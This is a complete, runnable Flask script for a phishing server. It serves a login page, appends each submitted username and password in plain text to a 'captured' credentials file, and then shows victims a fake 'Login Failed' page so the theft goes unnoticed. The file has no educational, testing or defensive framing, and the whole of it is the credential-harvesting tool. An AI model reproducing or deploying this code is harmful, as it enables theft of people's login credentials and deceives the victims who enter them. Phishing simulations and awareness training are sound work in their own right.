from flask import Flask, render_template, request, redirect
import os

app = Flask(__name__)

# Ensure a folder for saving credentials exists
os.makedirs("captured", exist_ok=True)

@app.route("/", methods=["GET"])
def index():
    return render_template("login.html")

@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username")
    password = request.form.get("password")

    with open("captured/captured_credentials.txt", "a") as f:
        f.write(f"Username: {username} | Password: {password}\n")

    return redirect("/failed")

@app.route("/failed", methods=["GET"])
def failed():
    return "<h2>Login Failed. Please try again later.</h2>", 403

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
